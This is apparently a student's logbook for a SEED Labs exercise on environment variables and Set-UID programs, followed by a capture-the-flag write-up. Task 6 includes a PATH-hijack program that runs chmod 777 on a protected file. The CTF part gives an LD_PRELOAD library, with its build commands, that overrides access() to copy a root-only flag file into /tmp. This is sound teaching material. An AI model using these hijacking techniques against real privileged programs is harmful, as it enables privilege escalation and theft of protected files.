# Trabalho realizado na Semana #4 - Environment Variable and Set-UID Lab

For this week we where proposed to do tasks presented on this link:
https://seedsecuritylabs.org/Labs_20.04/Software/Environment_Variable_and_SetUID/

## Task 1: Manipulating Environment Variables
1. Use printenv/env to print out the environment variables

![PrintenvEnv](/Logbooks/img/Week4/Task1.1.png)

2. Use export and unset to set or unset environment variables

![ExportUnset](/Logbooks/img/Week4/Task1.2.png)


## Task 2: Passing Environment Variables from Parent Process to Child Process
1. We compiled and ran the myprintenv.c file by typping "gcc myprintenv.c". This program could be found in the Labsetup folder when cloning this repository https://github.com/seed-labs/seed-labs. With this, a file a.out was generated and we ran it too and saved its output into a file using "a.out > file".

![Compile](/Logbooks/img/Week4/Task2.1.png)

2. For step 2, we now commented the printenv() statement in the child case and uncommented the printenv() in the parent process case. By compiling and running the code again, we discovered with the help of the diff command that the output was the same for both programs, meaning the environment variables are the same for a parent process and its child process when created through the default configuration of fork

![ResultComparison](/Logbooks/img/Week4/Tasks2.2.png)


**myprintenv.c:**

```c++
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

void printenv()
{
  int i = 0;
  while (environ[i] != NULL) {
      printf("%s\n", environ[i]);
      i++;
  }
}

void main()
{
  pid_t childPid;
  switch(childPid = fork()) {
    case 0:  /* child process */
      // printenv();          
      exit(0);
    default:  /* parent process */
      printenv();       
      exit(0);
  }
}
```


## Task 3: Environment Variables and execve()

1. Compiled and ran myenv.c, program made to print out the environment variables of the current process.

![CompileTask3](/Logbooks/img/Week4/Task3.1.png)

2. There was no output because since execve() receives NULL in the third argument (array of environment variables), the new process has no environment variables 

![Output1](/Logbooks/img/Week4/Task3.2.png)

3. Changed `execve("/usr/bin/env", argv, NULL);` to `execve("/usr/bin/env", argv, environ);` on the file and compiled and ran it. This time there was output since we inserted the pointer to the array of the parent processe's environment variables (environ) in the third argument of the function execve, printing out the environment variables of the parent's process.

![Output2](/Logbooks/img/Week4/Task3.3.png)

**myenv.c:**

```c++
#include <unistd.h>

extern char **environ;

int main()
{
  char *argv[2];

  argv[0] = "/usr/bin/env";
  argv[1] = NULL;

  execve("/usr/bin/env", argv, environ);  

  return 0 ;
}
```

## Task 4: Environment Variables and system()

1. Created the file system1.c with the given segment of code in the lab. This file is similar to the one presented in Task 3 but it differs on how the calls are made since system() is used. This way, system() calls execl(), execl() calls execve() and /bin/sh is executed with the argument given to system(). With this, the parent's process environment variables are printed out.


**system1.c:**

```c++
#include <stdio.h>
#include <stdlib.h>

int main()
{
    system("/usr/bin/env");
    return 0 ;
}
```


## Task 5: Environment Variable and Set-UID Programs

1. Create a file (printAllEV.c) with the segment of code given in the lab, that prints all the environment variables in the current process.

2. Compile the program, change its ownership to root and make it a SET-UID program.

![ChangeOwnership](/Logbooks/img/Week4/Task5.2.png)

3. Set the PATH, LD_LIBRARY_PATH and ANY_NAME environment variables to random values and ran the program.

![ChangeEV](/Logbooks/img/Week4/Task5.3.png)

4. When checking the results we discovered that only the LD_LIBRARY_PATH environment variable wasn't present and that ANY_NAME and PATH had changed.

![ANY_NAME](/Logbooks/img/Week4/Task5.4.1.png)

![PATH](/Logbooks/img/Week4/Task5.4.2.png)


## Task 6: The PATH Environment Variable and Set-UID Programs

1. Calling system() within a Set-UID program is dangerous because since these type of programs run with it's owners privileges, a user can running this program and manipulate the environment variables who may be malicious. 

2. On the given file (we called it manipulate.c), the program executes the system function calling the command `ls`. This way we can manipulate the environment variables to trick the program into calling another version created by us of `ls`

3. Following the seed labs guide, we now created a new file called manipulate1.c that makes the user gain access to a file that is highly permission restrictive.

**Before running manipulate1:**

![beforeManipulate1](/Logbooks/img/Week4/beforeManipulate1.png)


**After running manipulate1:**

![afterManipulate1](/Logbooks/img/Week4/afterManipulate1.png)


**manipulate.c:** 

```c++
#include <stdio.h>
#include <stdlib.h>

int main()
{
    system("ls");
    return 0;
}
```

**manipulate1.c:**

```c++
#include <stdio.h>
#include <stdlib.h>

int main() {

    printf("SNEAKY SNEAKY!\n");
    system("chmod 777 /home/seed/Documents/Week4/highPermissionFile");

    return 0;
}
```

# CTF - Control The Flag

1. We entered the given server using this command `nc ctf-fsi.fe.up.pt 4006`.

2. We checked the available files and respective permissions. The admin left a note that gave us a hint that accessing the /tmp folder will be important to find the flag.

**my_script.sh:**

![myScript](/Logbooks/img/Week4/myScript.png)


**Running my_script.sh:**

![runningMyScript](/Logbooks/img/Week4/runScript.png)


**main.c:**
```c++
#include <stdio.h>
#include <unistd.h>

void my_big_congrats(){
    puts("TODO - Implement this in the near future!");
}

int main() {
    puts("I'm going to check if the flag exists!");

    if (access("/flags/flag.txt", F_OK) == 0) {
        puts("File exists!!");
        my_big_congrats();
    } else {
        puts("File doesn't exist!");
    }

    return 0;
```

3. Analysing these files, we realized that `my_script.sh` intended to define the environment variables trough the file present in `/home/flag_reader/env` if it exists and after that execute the program `reader`.

4. By checking the permissions of the files, we checked that we had permission to change `env` and that it pointed to a env in a folder tmp

**Permissions of the files:**

![Permissions](/Logbooks/img/Week4/permissions.png)

5. To achieve the flag, we based our program on the Task 7 of this week. We started by going to the folder `tmp` and there we inserted our program to overload the access function, we called it myLIB.c:

**myLIB.c:**
```c++
#include <stdio.h>
#include <stdlib.h>
int access(const char *pathname, int mode) {
    system("cat /flags/flag.txt > /tmp/myflag.txt");
    return 0;
}


gcc -fPIC -g -c myLIB.c

gcc -shared -o myLIB.so.1.0.1 myLIB.o -lc
```

6. Our main goal was to create our own custom dynamic link library (myLIB.c) and inject a EV LD_PRELOAD into `env` so that when the server runs `my_script` in root mode, that variable is exported. After that, the `reader` runs. 

```
$ gcc -fPIC -g -c myLIB.c
```

```
gcc -shared -o myLIB.so.1.0.1 myLIB.o -lc
```

![compile1](/Logbooks/img/Week4/compile1.png?ref_type=heads)

![compile2](/Logbooks/img/Week4/compile2.png?ref_type=heads)

![envModified](/Logbooks/img/Week4/envModified.png?ref_type=heads)

7. Doing this, our shared library is loaded before all the other ones, letting us override the access() function called in main.c. With this, we can copy the flag.txt present in the folder `/flags` to our own .txt file in the `/tmp` folder, we called it myflag.txt. Then we gave this file all the permissions with the command `chmod 4777 myflag.txt` and waited until the flag was transfered. Waiting a few minutes we got this:

![myFlag](/Logbooks/img/Week4/myflag.png?ref_type=heads)


## Observations

- We could have resolved this CTF challenge way earlier since we tried to implemented this exact same resolution the other week but we had no result since everyone could change what was present in the tmp folder. Because of that, our files were changed or the EV present in the env file was altered causing our program to not run properly and so making us think that our implementation was wrong when it wasn't.
